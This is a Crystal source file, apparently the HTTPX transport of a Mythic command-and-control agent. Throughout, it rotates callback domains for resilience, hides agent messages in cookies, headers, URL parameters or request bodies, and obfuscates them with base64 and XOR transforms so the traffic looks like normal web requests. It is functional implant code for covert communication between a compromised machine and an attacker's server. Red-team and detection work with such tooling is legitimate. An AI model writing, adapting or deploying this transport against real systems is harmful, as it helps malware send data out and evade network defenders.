require "http/client"
require "json"
require "base64"
require "./base"
require "../config"

module Dark::Agent::Transport
  # HTTPX transport with malleable profiles
  class HTTPX < Base
    # Make it a singleton so we can access it from outside
    @@instance : HTTPX?

    # MALLEABLE PROFILE CONFIGURATION

    # Malleable profile settings
    @profile : Hash(String, JSON::Any) = {} of String => JSON::Any
    @get_uris : Array(String) = [] of String
    @post_uris : Array(String) = [] of String
    @get_transforms_client : Array(Hash(String, String)) = [] of Hash(String, String)
    @get_transforms_server : Array(Hash(String, String)) = [] of Hash(String, String)
    @post_transforms_client : Array(Hash(String, String)) = [] of Hash(String, String)
    @post_transforms_server : Array(Hash(String, String)) = [] of Hash(String, String)
    @get_headers_client : Hash(String, String) = {} of String => String
    @post_headers_client : Hash(String, String) = {} of String => String
    @get_message_location : String = ""
    @get_message_name : String = ""
    @post_message_location : String = ""
    @post_message_name : String = ""

    # Store the selected callback domain
    @selected_domain : String = ""
    # Store all available domains
    @available_domains : Array(String) = [] of String
    # Store the current domain index for round-robin rotation
    @current_domain_index : Int32 = 0
    # Counter for failed callbacks (for fail-over strategy)
    @consecutive_failures : Int32 = 0

    # INITIALIZATION

    def self.instance : HTTPX
      @@instance.not_nil!
    end

    def initialize(config : Config::Base)
      super(config)
      @@instance = self

      # Initialize domains from config
      initialize_domains

      # Parse the profile configuration
      parse_profile

      if @config.has_encryption?
        log_debug("HTTPX Transport initialized with encryption enabled")
      else
        log_debug("HTTPX Transport initialized with encryption DISABLED")
      end
    end

    # DOMAIN AND CONNECTION MANAGEMENT

    # Initialize domains from config
    private def initialize_domains
      # Initialize the profile hash to avoid nil checks
      if @profile.empty?
        log_debug("Profile is empty, initializing from config")
        c2_profile = @config.c2_profile
        if c2_profile.as_h?
          @profile = c2_profile.as_h
        end
      end

      log_debug("Initializing callback domains from available options")

      # Get domains from c2 configuration
      callback_domains = @profile["callback_domains"].as_a
      @available_domains = callback_domains.map do |domain|
        domain_str = domain.as_s
        # Ensure domain has protocol
        if !domain_str.starts_with?("http://") && !domain_str.starts_with?("https://")
          domain_str = "https://" + domain_str
        end
        domain_str
      end

      log_debug("Available domains: #{@available_domains.join(", ")}")
      
      # Initialize with the first domain
      select_initial_domain
    end
    
    # Select the initial domain based on the configured strategy
    private def select_initial_domain
      if @available_domains.empty?
        log_error("No callback domains available")
        return
      end
      
      # For both strategies, start with the first domain
      @current_domain_index = 0
      @selected_domain = @available_domains[@current_domain_index]
      
      log_debug("Initial domain selected: #{@selected_domain}")
      log_debug("Domain rotation strategy: #{@config.is_a?(Config::HTTPX) ? @config.as(Config::HTTPX).domain_rotation : "fail-over"}")
    end

    # Select a domain from the available callback_domains based on rotation strategy
    #
    # Mythic malleable profile: Chooses a C2 server from the available domains
    private def select_callback_domain
      # Handle empty domains list
      if @available_domains.empty?
        log_error("No callback domains available")
        return
      end
      
      # Get domain rotation strategy (using Config::HTTPX specific methods)
      if @config.is_a?(Config::HTTPX)
        httpx_config = @config.as(Config::HTTPX)
        rotation_strategy = httpx_config.domain_rotation
        
        case rotation_strategy
        when "round-robin"
          # For round-robin, rotate to the next domain on every call
          @current_domain_index = (@current_domain_index + 1) % @available_domains.size
          @selected_domain = @available_domains[@current_domain_index]
          log_debug("Round-robin rotation - selected domain: #{@selected_domain}")
          
        when "fail-over"
          # For fail-over, we'll increment the failure counter but keep the same domain
          # The actual domain rotation happens in handle_request_failure and handle_request_success
          # We leave @selected_domain as is
        else
          # For unknown strategies, default to using the first domain
          @selected_domain = @available_domains.first
          log_debug("Unknown rotation strategy '#{rotation_strategy}', using first domain: #{@selected_domain}")
        end
      else
        # Default behavior if config is not HTTPX (shouldn't happen)
        @selected_domain = @available_domains.first
        log_debug("Non-HTTPX config, using first domain: #{@selected_domain}")
      end
    end
    
    # Handle a request failure for domain rotation purposes
    private def handle_request_failure
      # Only relevant for fail-over strategy
      if @config.is_a?(Config::HTTPX) && @config.as(Config::HTTPX).domain_rotation == "fail-over"
        httpx_config = @config.as(Config::HTTPX)
        threshold = httpx_config.failover_threshold
        
        @consecutive_failures += 1
        log_debug("Request failed, consecutive failures: #{@consecutive_failures}/#{threshold}")
        
        # Check if we've reached the threshold for domain rotation
        if @consecutive_failures >= threshold
          # Reset failure counter
          @consecutive_failures = 0
          
          # Rotate to the next domain
          @current_domain_index = (@current_domain_index + 1) % @available_domains.size
          @selected_domain = @available_domains[@current_domain_index]
          
          log_debug("Fail-over threshold reached, rotating to next domain: #{@selected_domain}")
        end
      end
    end
    
    # Handle a request success for domain rotation purposes
    private def handle_request_success
      # Reset the failure counter on successful request
      if @config.is_a?(Config::HTTPX) && @config.as(Config::HTTPX).domain_rotation == "fail-over"
        if @consecutive_failures > 0
          log_debug("Request succeeded, resetting consecutive failures counter")
          @consecutive_failures = 0
        end
      end
    end

    # Get callback host from the selected domain
    protected def get_callback_host : String
      host = @selected_domain

      # Remove protocol prefix if present
      host = host.gsub(/^https?:\/\//, "")

      # Remove port number if present (e.g., "example.com:8443" -> "example.com")
      host = host.gsub(/:\d+$/, "")

      return host
    end

    # Get callback port from domain
    protected def get_callback_port : String
      # Check if the domain URL contains an explicit port
      if @selected_domain =~ /:(\d+)/
        return $1
      end

      # If no explicit port, determine from protocol
      return @selected_domain.starts_with?("http://") ? "80" : "443"
    end

    # Determine if TLS should be used
    protected def get_use_tls? : Bool
      # Use HTTPS unless explicitly http://
      !@selected_domain.starts_with?("http://")
    end

    # PROFILE PARSING AND CONFIGURATION

    # Parse the malleable profile from config
    #
    # Mythic malleable profile: Loads C2 profile configuration for traffic customization
    private def parse_profile
      begin
        # Get the C2 profile and convert to hash
        c2_profile = @config.c2_profile
        if c2_profile.as_h?
          @profile = c2_profile.as_h
        else
          log_error("C2 profile is not a hash, using empty profile")
          # @profile is already initialized as empty hash
          return
        end

        # Extract GET configuration
        if @profile["raw_c2_config"]? && @profile["raw_c2_config"]["get"]?
          get_config = @profile["raw_c2_config"]["get"]

          # URIs
          if get_config["uris"]? && get_config["uris"].as_a?
            @get_uris = get_config["uris"].as_a.map(&.as_s)
          end

          # Client configuration
          if get_config["client"]?
            client = get_config["client"]

            # Headers
            if client["headers"]?
              client["headers"].as_h.each do |k, v|
                @get_headers_client[k] = v.as_s
              end
            end

            # Message location and name
            if client["message"]?
              message = client["message"]
              @get_message_location = message["location"]?.try(&.as_s) || ""
              @get_message_name = message["name"]?.try(&.as_s) || ""
            end

            # Transforms
            if client["transforms"]?
              @get_transforms_client = client["transforms"].as_a.map do |transform|
                {"action" => transform["action"].as_s, "value" => transform["value"]?.try(&.as_s) || ""}
              end
            end
          end

          # Server configuration
          if get_config["server"]? && get_config["server"]["transforms"]?
            @get_transforms_server = get_config["server"]["transforms"].as_a.map do |transform|
              {"action" => transform["action"].as_s, "value" => transform["value"]?.try(&.as_s) || ""}
            end
          end
        end

        # Extract POST configuration
        if @profile["raw_c2_config"]? && @profile["raw_c2_config"]["post"]?
          post_config = @profile["raw_c2_config"]["post"]

          # URIs
          if post_config["uris"]?
            @post_uris = post_config["uris"].as_a.map(&.as_s)
          end

          # Client configuration
          if post_config["client"]?
            client = post_config["client"]

            # Headers
            if client["headers"]?
              client["headers"].as_h.each do |k, v|
                @post_headers_client[k] = v.as_s
              end
            end

            # Message location and name
            if client["message"]?
              message = client["message"]
              @post_message_location = message["location"]?.try(&.as_s) || ""
              @post_message_name = message["name"]?.try(&.as_s) || ""
            end

            # Transforms
            if client["transforms"]?
              @post_transforms_client = client["transforms"].as_a.map do |transform|
                {"action" => transform["action"].as_s, "value" => transform["value"]?.try(&.as_s) || ""}
              end
            end
          end

          # Server configuration
          if post_config["server"]? && post_config["server"]["transforms"]?
            @post_transforms_server = post_config["server"]["transforms"].as_a.map do |transform|
              {"action" => transform["action"].as_s, "value" => transform["value"]?.try(&.as_s) || ""}
            end
          end
        end

        log_debug("HTTPX profile loaded successfully")
      rescue ex
        log_error("Failed to parse HTTPX profile: #{ex.message}")
      end
    end

    # MYTHIC TRANSPORT IMPLEMENTATION

    # Implementation of process_response required by Base class
    #
    # Mythic communication: Processes and decrypts C2 responses with transforms
    protected def process_response(raw_body : String) : String
      # Use the POST transforms by default for processing responses
      process_with_transforms(raw_body, @post_transforms_server)
    end

    # Implementation of send_request required by Base class
    #
    # Mythic communication: Sends data to C2 using malleable profile transforms
    protected def send_request(message : String) : {::HTTP::Client::Response?, String?}
      # If using round-robin, select the next domain before sending
      if @config.is_a?(Config::HTTPX) && @config.as(Config::HTTPX).domain_rotation == "round-robin"
        select_callback_domain
      end
      
      # Apply transformations for POST request
      transformed_message = apply_transforms(message, @post_transforms_client)

      # Format according to profile settings
      path, headers, body = format_message_for_request(
        transformed_message,
        @post_message_location,
        @post_message_name,
        "POST"
      )

      # Send HTTP request
      response, body = send_http_request(build_full_url(path), headers, body)
      
      # Handle the request result for domain rotation
      if response.nil? || !response.success? || body.nil? || body.empty?
        # Request failed
        handle_request_failure
      else
        # Request succeeded
        handle_request_success
      end
      
      {response, body}
    end

    # TRANSFORMS AND MESSAGE FORMATTING

    # Apply transformations to a message
    #
    # Mythic malleable profile: Applies configured transforms to outgoing data
    private def apply_transforms(message : String, transforms : Array(Hash(String, String))) : String
      result = message

      transforms.each do |transform|
        action = transform["action"]
        value = transform["value"]

        case action
        when "base64"
          result = Base64.strict_encode(result.to_slice)
        when "base64url"
          result = Base64.urlsafe_encode(result.to_slice)
        when "prepend"
          result = value + result
        when "append"
          result = result + value
        when "xor"
          if !value.empty?
            # XOR transform using the value as key
            key_bytes = value.to_slice
            data_bytes = result.to_slice
            result_bytes = Bytes.new(data_bytes.size)

            data_bytes.size.times do |i|
              key_index = i % key_bytes.size
              result_bytes[i] = data_bytes[i] ^ key_bytes[key_index]
            end

            result = String.new(result_bytes)
          end
        end
      end

      result
    end

    # Reverse transformations on a response
    #
    # Mythic malleable profile: Reverses transforms on incoming server responses
    private def reverse_transforms(message : String, transforms : Array(Hash(String, String))) : String
      result = message

      # Process transforms in reverse order
      transforms.reverse.each do |transform|
        action = transform["action"]
        value = transform["value"]

        case action
        when "base64"
          result = String.new(Base64.decode(result))
        when "base64url"
          # Fix base64url decoding by properly replacing characters and using decode method
          standardized = result.gsub('-', '+').gsub('_', '/')
          # Add padding if needed
          padding = standardized.size % 4
          if padding > 0
            standardized += "=" * (4 - padding)
          end
          result = String.new(Base64.decode(standardized))
        when "prepend"
          if result.starts_with?(value)
            result = result[value.size..]
          end
        when "append"
          if result.ends_with?(value)
            result = result[0...result.size - value.size]
          end
        when "xor"
          if !value.empty?
            # XOR transform using the value as key
            key_bytes = value.to_slice
            data_bytes = result.to_slice
            result_bytes = Bytes.new(data_bytes.size)

            data_bytes.size.times do |i|
              key_index = i % key_bytes.size
              result_bytes[i] = data_bytes[i] ^ key_bytes[key_index]
            end

            result = String.new(result_bytes)
          end
        end
      end

      result
    end

    # Process the server response with transforms
    #
    # Mythic malleable profile: Processes server responses through transforms pipeline
    private def process_with_transforms(raw_body : String, transforms : Array(Hash(String, String))) : String
      return "" if raw_body.empty?

      begin
        # First reverse any transforms from the profile
        response_content = reverse_transforms(raw_body, transforms)

        # Then handle encryption if enabled
        if @config.has_encryption?
          # Try processing directly first
          result = decrypt_message(response_content)
          return result unless result.empty?

          # If that fails, maybe it's binary that needs base64 encoding
          response_base64 = Base64.strict_encode(response_content.to_slice)
          return decrypt_message(response_base64)
        else
          # For unencrypted responses
          decoded_bytes = Base64.decode(response_content)
          return decoded_bytes.size > 36 ? String.new(decoded_bytes[36..]) : ""
        end
      rescue ex
        log_error("Error processing response: #{ex.message}")
        return ""
      end
    end

    # Format message according to profile (in cookie, header, body, etc)
    #
    # Mythic malleable profile: Formats message according to profile placement settings
    private def format_message_for_request(message : String, location : String, name : String, method : String) : {String, ::HTTP::Headers, String}
      http_headers = ::HTTP::Headers.new

      # Add headers from profile
      headers = method == "GET" ? @get_headers_client : @post_headers_client
      headers.each { |k, v| http_headers[k] = v }

      # Default URL path
      path = "/"

      # Choose a random URI from the configured list
      uris = method == "GET" ? @get_uris : @post_uris
      if !uris.empty?
        path = uris.sample
      end

      # Format the message according to its location
      body = ""

      case location.downcase
      when "cookie"
        if !name.empty?
          http_headers.add("Cookie", "#{name}=#{message}")
        end
      when "header"
        if !name.empty?
          http_headers[name] = message
        end
      when "parameter"
        if !name.empty?
          # Add as URL parameter
          path += path.includes?("?") ? "&" : "?"
          path += "#{name}=#{message}"
        end
      when "body", ""
        # Message goes in body for POST
        body = message
      end

      {path, http_headers, body}
    end

    # HTTP TRANSPORT HELPERS

    # Build a full URL from the selected domain and path
    #
    # Mythic communication: Builds C2 server URL from profile configuration
    protected def build_full_url(path : String) : String
      # Start with the selected domain
      url = @selected_domain

      # Ensure URL has protocol
      if !url.starts_with?("http://") && !url.starts_with?("https://")
        url = "https://" + url
      end

      # Add path if provided
      if !path.empty?
        # Avoid double slashes
        if url.ends_with?("/") && path.starts_with?("/")
          url += path[1..]
        elsif !url.ends_with?("/") && !path.starts_with?("/")
          url += "/" + path
        else
          url += path
        end
      end

      url
    end
  end
end